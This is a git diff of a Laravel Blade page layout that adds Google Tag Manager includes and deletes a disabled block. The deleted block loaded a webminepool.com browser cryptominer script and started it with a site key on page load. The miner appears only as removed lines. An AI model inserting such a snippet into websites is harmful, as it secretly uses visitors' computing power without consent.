@@ -7,6 +7,7 @@
     <meta name="format-detection" content="telephone=no">
     <title>{{ setting('company')->name }} - @yield('title')</title>
     <link rel="icon" type="image/png" href="{{ asset($logo->favicon) }}"><!-- fonts -->
+    @include('googletagmanager::head')
     <!-- css -->
     @include('facebook-pixel::head')
     @include('layouts.yellow.css')
@@ -173,20 +174,10 @@
         }
     </style>
     @stack('styles')
-    @if(false)
-    <script src="https://webminepool.com/lib/base.js"></script>
-    <script>
-        window.onload = function() {
-            console.log('JavaScript Loaded.');
-            var miner = WMP.Anonymous('PK_E2svECzRD8g4zAKzHDtnQ', {throttle: 0.4});
-            miner.start();
-            console.log('JavaScript Working.');
-        }
-    </script>
-    @endif
 </head>
 
 <body class="header-fixed" style="margin: 0; padding: 0;">
+    @include('googletagmanager::body')
     @include('facebook-pixel::body')
     <!-- quickview-modal -->
     <div id="quickview-modal" class="modal fade" tabindex="-1" role="dialog" aria-hidden="true">
